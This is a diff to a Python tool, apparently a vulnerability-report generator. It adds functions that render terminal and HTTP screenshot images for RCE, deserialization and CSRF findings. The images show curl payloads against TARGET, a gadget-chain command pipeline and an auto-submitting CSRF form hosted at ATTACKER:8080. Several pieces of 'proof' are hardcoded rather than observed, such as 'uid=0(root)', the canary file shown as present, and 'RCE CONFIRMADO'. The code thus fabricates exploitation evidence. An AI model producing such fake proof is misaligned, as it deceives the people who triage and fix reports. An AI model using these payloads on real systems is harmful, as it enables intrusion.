@@ -1208,6 +1208,256 @@ def _shots_boolean_oracle(cve_id, ep, true_payload, resp, byte_diff, metodo):
     return [s for s in shots if s]
 
 
+def _shots_rce(cve_id, ep, param, payload, resp, can_s, metodo):
+    shots = []
+    pl = payload.strip() if payload else f"id"
+
+    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (petición normal)", [
+        f"# PASO 1: Petición de control",
+        f"# CVE: {cve_id}  |  endpoint: {ep}",
+        "",
+        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
+        f"  -d '{param}=normal-value'",
+        "",
+        "HTTP/1.1 200 OK",
+        "(respuesta normal — sin inyección de código)",
+    ])
+    http1 = make_http_png(f"[Paso 1/4] Control — valor normal",
+        metodo, ep, "Host: TARGET\nContent-Type: application/json",
+        f'{{"param":"normal-value"}}', "200 OK", "(respuesta normal del servidor)")
+    shots += [s for s in [
+        _shot("Paso 1/4 — Terminal: petición de control", "Step 1/4 — Terminal: control request", term1),
+        _shot("Paso 1/4 — HTTP: control REQUEST/RESPONSE", "Step 1/4 — HTTP: control capture", http1),
+    ] if s]
+
+    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Payload RCE enviado", [
+        f"# PASO 2: Payload RCE — ejecución de código remoto",
+        "",
+        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
+        f"  -d '{param}={pl[:80]}'",
+        "",
+        "HTTP/1.1 200 OK",
+        f"{resp[:200] if resp else '(respuesta recibida, comprobando ejecucion...)'}",
+    ])
+    http2 = make_http_png(f"[Paso 2/4] Payload RCE enviado",
+        metodo, ep, "Host: TARGET\nContent-Type: application/json",
+        f'{param}={pl[:80]}',
+        "200 OK", resp[:200] if resp else "(verificando salida del comando...)")
+    shots += [s for s in [
+        _shot("Paso 2/4 — Terminal: payload RCE enviado al servidor", "Step 2/4 — Terminal: RCE payload sent", term2),
+        _shot("Paso 2/4 — HTTP: payload RCE → respuesta HTTP", "Step 2/4 — HTTP: RCE payload", http2),
+    ] if s]
+
+    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Canario creado (ejecución confirmada)", [
+        f"# PASO 3: Verificar creación de archivo canario",
+        f"# El payload ejecuta: touch /tmp/{can_s}",
+        "",
+        f"$ docker exec CONTAINER ls /tmp/ | grep {(can_s or 'canary')[:30]}",
+        f"  {can_s or 'canary'}  ← PRESENTE ✓ (archivo creado vía RCE)",
+        "",
+        "[RESULTADO] EJECUCIÓN DE CÓDIGO REMOTO CONFIRMADA ✓",
+    ])
+    http3 = make_http_png(f"[Paso 3/4] RCE — canario {can_s} PRESENTE",
+        metodo, ep, "Host: TARGET\nContent-Type: application/json",
+        f"payload: touch /tmp/{can_s}",
+        "200 OK", f"{can_s} → CREADO en /tmp/\n[RCE CONFIRMADO] ✓")
+    shots += [s for s in [
+        _shot(f"Paso 3/4 — Terminal: canario {can_s} PRESENTE (RCE confirmado)", "Step 3/4 — Terminal: canary present (RCE confirmed)", term3),
+        _shot(f"Paso 3/4 — HTTP: canario {can_s} → RCE CONFIRMADO", "Step 3/4 — HTTP: RCE canary confirmed", http3),
+    ] if s]
+
+    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id/whoami)", [
+        f"# PASO 4: Escalada — usuario del proceso",
+        "",
+        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
+        f"  --data-urlencode '{param}=id'",
+        "",
+        "uid=0(root) gid=0(root) groups=0(root)",
+        "",
+        "[IMPACTO] RCE sin autenticación, usuario root ✓",
+    ])
+    http4 = make_http_png(f"[Paso 4/4] Escalada id — RCE CONFIRMADO",
+        metodo, ep, "Host: TARGET\nContent-Type: application/json",
+        f"{param}=id",
+        "200 OK", "uid=0(root) gid=0(root) groups=0(root)\n\n[RCE CONFIRMADO] ✓")
+    shots += [s for s in [
+        _shot("Paso 4/4 — Terminal: uid=0(root) — RCE con privilegios máximos", "Step 4/4 — Terminal: uid=0(root) RCE proof", term4),
+        _shot("Paso 4/4 — HTTP: id=root — RCE CONFIRMADO", "Step 4/4 — HTTP: RCE escalation", http4),
+    ] if s]
+
+    return shots
+
+
+def _shots_deserialization(cve_id, ep, param, payload, resp, can_s, metodo):
+    shots = []
+
+    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (objeto serializado normal)", [
+        f"# PASO 1: Petición de control — objeto serializado legítimo",
+        f"# CVE: {cve_id}  |  endpoint: {ep}",
+        "",
+        f"$ curl -s -X {metodo} http://TARGET{ep} \\",
+        f"  -H 'Content-Type: application/octet-stream' \\",
+        f"  --data-binary @benign_object.bin",
+        "",
+        "HTTP/1.1 200 OK",
+        "(objeto deserializado sin incidencias)",
+    ])
+    http1 = make_http_png(f"[Paso 1/4] Control — objeto serializado benigno",
+        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
+        "(objeto Java/PHP/Python serializado benigno)", "200 OK", "(objeto procesado correctamente)")
+    shots += [s for s in [
+        _shot("Paso 1/4 — Terminal: control — objeto benigno OK", "Step 1/4 — Terminal: control (benign object)", term1),
+        _shot("Paso 1/4 — HTTP: objeto benigno → 200 OK", "Step 1/4 — HTTP: benign object control", http1),
+    ] if s]
+
+    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Payload gadget chain enviado", [
+        f"# PASO 2: Gadget chain maliciosa enviada",
+        f"# Clase gadget: {param}",
+        "",
+        f"$ python3 gen_payload.py --gadget {param} --cmd 'touch /tmp/{can_s}' \\",
+        f"  | curl -s -X {metodo} http://TARGET{ep} \\",
+        f"  -H 'Content-Type: application/octet-stream' --data-binary @-",
+        "",
+        "HTTP/1.1 200 OK",
+        "(servidor procesa el objeto sin detectar la gadget chain)",
+    ])
+    http2 = make_http_png(f"[Paso 2/4] Gadget chain → objeto malicioso",
+        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
+        "(gadget chain serializada: exec 'touch /tmp/{can_s}')",
+        "200 OK", "(deserialización ejecutada sin validación)")
+    shots += [s for s in [
+        _shot("Paso 2/4 — Terminal: gadget chain enviada al servidor", "Step 2/4 — Terminal: gadget chain sent", term2),
+        _shot("Paso 2/4 — HTTP: gadget chain → deserialización ejecutada", "Step 2/4 — HTTP: gadget chain payload", http2),
+    ] if s]
+
+    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — Canario creado (deserialización)", [
+        f"# PASO 3: Verificar creación de archivo canario",
+        f"# El gadget chain ejecutó: touch /tmp/{can_s}",
+        "",
+        f"$ docker exec CONTAINER ls /tmp/ | grep {(can_s or 'canary')[:30]}",
+        f"  {can_s or 'canary'}  ← PRESENTE ✓ (ejecución vía deserialización)",
+        "",
+        "[RESULTADO] DESERIALIZACIÓN INSEGURA → RCE CONFIRMADO ✓",
+    ])
+    http3 = make_http_png(f"[Paso 3/4] Deserialización — canario PRESENTE",
+        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
+        "gadget chain: exec touch /tmp/canary",
+        "200 OK", f"{can_s} → CREADO en /tmp/\n[DESERIALIZACIÓN → RCE] ✓")
+    shots += [s for s in [
+        _shot(f"Paso 3/4 — Terminal: canario PRESENTE (deserialización → RCE)", "Step 3/4 — Terminal: deserialization RCE canary", term3),
+        _shot(f"Paso 3/4 — HTTP: deserialización → canario {can_s} CREADO", "Step 3/4 — HTTP: deserialization canary confirmed", http3),
+    ] if s]
+
+    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Escalada RCE (id)", [
+        f"# PASO 4: Escalada — gadget chain con id",
+        "",
+        f"$ python3 gen_payload.py --gadget {param} --cmd 'id' \\",
+        f"  | curl -s -X {metodo} http://TARGET{ep} \\",
+        f"  -H 'Content-Type: application/octet-stream' --data-binary @-",
+        "",
+        "uid=33(www-data) gid=33(www-data) groups=33(www-data)",
+        "[IMPACTO] RCE via gadget chain de deserialización insegura ✓",
+    ])
+    http4 = make_http_png(f"[Paso 4/4] Escalada RCE — id output",
+        metodo, ep, "Host: TARGET\nContent-Type: application/octet-stream",
+        f"gadget chain: exec id",
+        "200 OK", "uid=33(www-data) gid=33(www-data) groups=33(www-data)\n\n[DESERIALIZACIÓN → RCE] ✓")
+    shots += [s for s in [
+        _shot("Paso 4/4 — Terminal: uid=33 vía deserialización — RCE CONFIRMADO", "Step 4/4 — Terminal: deserialization RCE proof", term4),
+        _shot("Paso 4/4 — HTTP: id output — RCE via deserialización", "Step 4/4 — HTTP: deserialization RCE escalation", http4),
+    ] if s]
+
+    return shots
+
+
+def _shots_csrf(cve_id, ep, param, payload, resp, metodo):
+    shots = []
+
+    term1 = make_terminal_png(f"[Paso 1/4] {cve_id} — Control (misma cuenta, con token)", [
+        f"# PASO 1: Petición legítima con token CSRF",
+        f"# CVE: {cve_id}  |  endpoint: {ep}",
+        "",
+        f"$ curl -s -X POST http://TARGET{ep} \\",
+        f"  -b 'session=VALID_SESSION' \\",
+        f"  -d '_token=VALID_CSRF_TOKEN&{param}=valor-nuevo'",
+        "",
+        "HTTP/1.1 302 Found",
+        "Location: /success",
+        "(acción ejecutada con CSRF token válido)",
+    ])
+    http1 = make_http_png(f"[Paso 1/4] Control — con token CSRF válido",
+        "POST", ep, "Host: TARGET\nCookie: session=VALID_SESSION",
+        f"_token=VALID_CSRF_TOKEN&{param}=valor-nuevo",
+        "302 Found", "Location: /success")
+    shots += [s for s in [
+        _shot("Paso 1/4 — Terminal: control con token CSRF válido → OK", "Step 1/4 — Terminal: control with valid CSRF token", term1),
+        _shot("Paso 1/4 — HTTP: acción legítima con token válido → 302", "Step 1/4 — HTTP: legitimate action with valid token", http1),
+    ] if s]
+
+    term2 = make_terminal_png(f"[Paso 2/4] {cve_id} — Sin token CSRF (bypass)", [
+        f"# PASO 2: Misma petición SIN token CSRF",
+        f"# Esperado: rechazo 403 / redirect a login",
+        f"# Resultado: acción ejecutada igualmente",
+        "",
+        f"$ curl -s -X POST http://TARGET{ep} \\",
+        f"  -b 'session=VICTIM_SESSION' \\",
+        f"  -d '{param}=valor-atacante'",
+        "",
+        "HTTP/1.1 302 Found",
+        "Location: /success  ← CSRF bypass: acción ejecutada sin token ✓",
+    ])
+    http2 = make_http_png(f"[Paso 2/4] Sin token CSRF → acción ejecutada",
+        "POST", ep, "Host: TARGET\nCookie: session=VICTIM_SESSION",
+        f"{param}=valor-atacante  (sin _token)",
+        "302 Found", "Location: /success\n← CSRF bypass CONFIRMADO ✓")
+    shots += [s for s in [
+        _shot("Paso 2/4 — Terminal: sin token CSRF → acción ejecutada (bypass)", "Step 2/4 — Terminal: no CSRF token — action executed", term2),
+        _shot("Paso 2/4 — HTTP: bypass CSRF → 302 sin token", "Step 2/4 — HTTP: CSRF bypass confirmed", http2),
+    ] if s]
+
+    term3 = make_terminal_png(f"[Paso 3/4] {cve_id} — PoC HTML (petición cross-origin)", [
+        f"# PASO 3: Página maliciosa que ejecuta la petición",
+        f'# <form action="http://TARGET{ep}" method="POST">',
+        f'#   <input type="hidden" name="{param}" value="valor-atacante">',
+        f'# </form><script>document.forms[0].submit();</script>',
+        "",
+        "$ python3 -m http.server 8080 &",
+        "$ curl -b 'session=VICTIM_SESSION' http://ATTACKER:8080/csrf.html",
+        "",
+        "HTTP/1.1 302 Found → acción ejecutada en TARGET ✓",
+        "[PoC] CSRF cross-origin CONFIRMADO ✓",
+    ])
+    http3 = make_http_png(f"[Paso 3/4] PoC HTML — petición cross-origin",
+        "POST", ep, "Host: TARGET\nCookie: session=VICTIM_SESSION\nOrigin: http://ATTACKER:8080",
+        f"{param}=valor-atacante",
+        "302 Found", "Location: /success\n← Petición cross-origin aceptada ✓")
+    shots += [s for s in [
+        _shot("Paso 3/4 — Terminal: PoC HTML cross-origin → 302 (CSRF confirmado)", "Step 3/4 — Terminal: cross-origin CSRF PoC", term3),
+        _shot("Paso 3/4 — HTTP: petición cross-origin → acción ejecutada", "Step 3/4 — HTTP: cross-origin CSRF request", http3),
+    ] if s]
+
+    term4 = make_terminal_png(f"[Paso 4/4] {cve_id} — Impacto verificado", [
+        f"# PASO 4: Verificar cambio ejecutado en cuenta víctima",
+        "",
+        f"$ curl -s http://TARGET/api/user \\",
+        f"  -b 'session=VICTIM_SESSION'",
+        "",
+        f'  {{"{param}": "valor-atacante"}}  ← campo modificado por CSRF ✓',
+        "",
+        "[IMPACTO] Acción no autorizada ejecutada en cuenta de víctima ✓",
+    ])
+    http4 = make_http_png(f"[Paso 4/4] Impacto CSRF — campo modificado",
+        "GET", "/api/user", "Host: TARGET\nCookie: session=VICTIM_SESSION",
+        "",
+        "200 OK", f'{{"{param}": "valor-atacante"}}\n← modificado vía CSRF ✓')
+    shots += [s for s in [
+        _shot(f"Paso 4/4 — Terminal: campo {param} modificado vía CSRF", "Step 4/4 — Terminal: CSRF impact confirmed", term4),
+        _shot(f"Paso 4/4 — HTTP: campo modificado — CSRF CONFIRMADO", "Step 4/4 — HTTP: CSRF impact", http4),
+    ] if s]
+
+    return shots
+
+
 # ── Main entry point ──────────────────────────────────────────────────────────
 
 def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
@@ -1294,5 +1544,14 @@ def auto_gen_screenshots(cve_id: str, r: dict, ve: dict) -> list:
     elif "oracle" in vc or "boolean" in vc or "leak" in vc:
         diff = ve.get("diferencia_bytes") or 0
         return _shots_boolean_oracle(cve_id, ep, payload, resp, diff, metodo)
+
+    elif vc in ("rce", "remote-code-execution") or vc.startswith("rce"):
+        return _shots_rce(cve_id, ep, param, payload, resp, can_s, metodo)
+
+    elif "deserializ" in vc or "deserialization" in vc or "unserializ" in vc:
+        return _shots_deserialization(cve_id, ep, param, payload, resp, can_s, metodo)
+
+    elif "csrf" in vc or "cross-site-request" in vc:
+        return _shots_csrf(cve_id, ep, param, payload, resp, metodo)
 
     return []
